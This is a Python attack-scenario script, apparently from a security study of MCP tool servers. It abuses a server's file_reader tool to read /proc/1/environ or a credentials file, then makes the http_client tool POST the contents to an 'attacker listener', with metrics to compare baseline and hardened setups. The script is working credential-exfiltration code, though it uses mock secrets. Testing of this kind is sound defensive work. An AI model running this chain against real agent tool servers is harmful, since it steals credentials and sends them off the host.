#!/usr/bin/env python3
"""
Purpose: Scenario B — Two-stage exfiltration via file_reader then http_client.
         Step 1: Read credentials.env using file_reader (depends on Scenario A path).
         Step 2: POST the credential payload to the attacker listener.
         Step 3: Verify receipt by checking exfil_received.log.
         Baseline: both tools cooperate; credentials reach the listener (M1 SUCCESS).
         Hardened: file_reader rejected (path) AND http_client rejected (allowlist);
                   ECS SG also blocks any outbound TCP outside VPC endpoints.
Component: 3 — Attack Scenarios and Timing
Metrics:   M1 (exfil delivery confirmed), M2 (credential items received), M3 (detection)
"""

import argparse
import asyncio
import json
import os
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

from mcp.client.session import ClientSession
from mcp.client.sse import sse_client

CREDENTIAL_PATTERNS = [
    ("AWS_ACCESS_KEY_ID",     "AKIAIOSFODNN7EXAMPLE",       "High"),
    ("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG",      "High"),
    ("DB_CONNECTION_STRING",  "FAKEPASSWORD123",             "High"),
    ("INTERNAL_API_TOKEN",    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MOCK", "Medium"),
]

# Primary path: EFS-mounted credentials file (seeded by mock_data/seed_secrets.sh).
# Fallback path: process environment, which exposes the same plaintext mock
# credentials injected as ECS task env vars (baseline misconfiguration).
# Both paths demonstrate the same vulnerability; the fallback ensures the
# scenario produces valid results even when EFS has not been seeded yet.
CREDENTIALS_PATHS = [
    "/proc/1/environ",                    # process env (always present; used first)
    "/mnt/data/config/credentials.env",   # EFS-backed (available after seed_secrets.sh)
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Scenario B — Credential exfiltration via http_client")
    parser.add_argument("--target-ip",      required=True)
    parser.add_argument("--port",           type=int, default=8080)
    parser.add_argument("--architecture",   choices=["baseline", "hardened"], default="baseline")
    parser.add_argument(
        "--listener-url",
        default="http://127.0.0.1:9999",
        help="URL of the attacker_listener.py HTTP server",
    )
    return parser.parse_args()


def _check_listener(listener_url: str) -> bool:
    """Return True if the attacker listener is reachable (GET returns 200)."""
    try:
        req = urllib.request.urlopen(listener_url, timeout=5)
        return req.status == 200
    except (urllib.error.URLError, OSError):
        return False


async def _call_tool(sse_url: str, tool: str, args_dict: dict) -> tuple[str | None, str | None]:
    """Call MCP tool. Returns (text_content, error_message)."""
    try:
        async with asyncio.timeout(35):
            async with sse_client(sse_url) as (read, write):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    result = await session.call_tool(tool, args_dict)
                    if result.isError:
                        err = result.content[0].text if result.content else "tool error"
                        return None, err
                    text = "\n".join(b.text for b in result.content if hasattr(b, "text"))
                    return text, None
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _build_payload(credential_text: str) -> str:
    """Build the POST body from credential file content."""
    return (
        "EXFILTRATED CREDENTIALS\n"
        "=======================\n"
        + credential_text
        + "\n=======================\n"
    )


def _scan_log_for_run(log_path: str, run_timestamp: str) -> bool:
    """
    Check whether exfil_received.log contains an entry with a timestamp
    that falls at or after run_timestamp. Returns True if confirmed received.
    """
    if not os.path.exists(log_path):
        return False
    try:
        with open(log_path, encoding="utf-8") as fh:
            return run_timestamp[:16] in fh.read()  # match YYYY-MM-DDTHH:MM prefix
    except OSError:
        return False


def main() -> None:
    args = _parse_args()
    sse_url = f"http://{args.target_ip}:{args.port}/sse"
    out_dir = os.path.join("results", args.architecture)
    os.makedirs(out_dir, exist_ok=True)
    exfil_log = os.path.join("results", "exfil_received.log")

    # ------------------------------------------------------------------
    # Pre-flight: verify attacker listener is running before executing
    # ------------------------------------------------------------------
    print(f"[Scenario B] Pre-flight: checking listener at {args.listener_url} ...")
    if not _check_listener(args.listener_url):
        print(
            f"ERROR: attacker_listener.py is not reachable at {args.listener_url}.\n"
            "Start it first:\n"
            "  python3 attacks/attacker_listener.py --port 9999\n"
            "Then re-run Scenario B.",
            file=sys.stderr,
        )
        sys.exit(1)
    print("  ✓ Listener reachable.\n")

    timestamp_start = datetime.now(timezone.utc).isoformat()
    runs = []

    for run_num in range(1, 4):
        print(f"[Scenario B] Run {run_num}/3 — architecture={args.architecture}")
        run_start = datetime.now(timezone.utc).isoformat()
        outcome = "FAILED"
        m2_items: list[dict] = []
        detail_parts = []

        # ── Step 1: Read credentials via file_reader (try each path) ─────
        cred_text, cred_err, used_path = None, None, None
        for cpath in CREDENTIALS_PATHS:
            print(f"  Step 1 → file_reader(path={cpath!r})")
            cred_text, cred_err = asyncio.run(_call_tool(sse_url, "file_reader", {"path": cpath}))
            if cred_err:
                print(f"    ✗ {cred_err}")
            else:
                used_path = cpath
                break

        if cred_err or cred_text is None:
            detail_parts.append(
                f"Step 1 FAILED: file_reader rejected all paths — {cred_err}. "
                "Credential retrieval is the prerequisite for exfiltration."
            )
            outcome = "FAILED"
        else:
            print(f"    ✓ {len(cred_text or '')} bytes retrieved from {used_path}")
            detail_parts.append(f"Step 1 SUCCESS: credentials read from {used_path}")

            # ── Step 2: Build POST payload ─────────────────────────────
            payload = _build_payload(cred_text or "")

            # ── Step 3: POST via http_client ───────────────────────────
            print(f"  Step 3 → http_client(url={args.listener_url!r}, method=POST)")
            http_text, http_err = asyncio.run(_call_tool(
                sse_url,
                "http_client",
                {"url": args.listener_url, "method": "POST", "body": payload},
            ))

            if http_err:
                detail_parts.append(f"Step 3 FAILED: http_client rejected — {http_err}")
                print(f"    ✗ {http_err}")
                outcome = "FAILED"
            else:
                print(f"    ✓ http_client response: {(http_text or '')[:80]}")
                detail_parts.append(f"Step 3 SUCCESS: POST returned {(http_text or '')[:40]}")

                # ── Verify receipt ─────────────────────────────────────
                time.sleep(1)  # brief pause for file write
                received = _scan_log_for_run(exfil_log, run_start)
                if received:
                    outcome = "SUCCESS"
                    detail_parts.append("Exfil confirmed: payload found in exfil_received.log")
                    # Identify which credential items were in the payload
                    for name, pattern, tier in CREDENTIAL_PATTERNS:
                        if pattern in payload:
                            m2_items.append({"item": name, "sensitivity_tier": tier})
                else:
                    outcome = "FAILED"
                    detail_parts.append(
                        "Exfil NOT confirmed: payload not found in exfil_received.log "
                        "(http_client may have been blocked at network layer)"
                    )

        run_end = datetime.now(timezone.utc).isoformat()
        runs.append({
            "run_number":        run_num,
            "run_start_time":    run_start,
            "run_end_time":      run_end,
            "outcome":           outcome,
            "m2_items_accessed": m2_items,
            "detail":            " | ".join(detail_parts),
        })
        print(f"  → Run {run_num} outcome: {outcome}")

        if run_num < 3:
            print("  Sleeping 5s before next run...")
            time.sleep(5)

    timestamp_end = datetime.now(timezone.utc).isoformat()
    success_count = sum(1 for r in runs if r["outcome"] == "SUCCESS")
    m1_pct = round(success_count / len(runs) * 100, 1)

    result = {
        "scenario":                "B",
        "architecture":            args.architecture,
        "timestamp_start":         timestamp_start,
        "timestamp_end":           timestamp_end,
        "runs":                    runs,
        "m1_success_rate_pct":     m1_pct,
        "m3_log_events_generated": None,
    }

    out_path = os.path.join(out_dir, "scenario_b_results.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    print(f"\n[Scenario B] Complete. M1={m1_pct}% | Results → {out_path}")


if __name__ == "__main__":
    main()
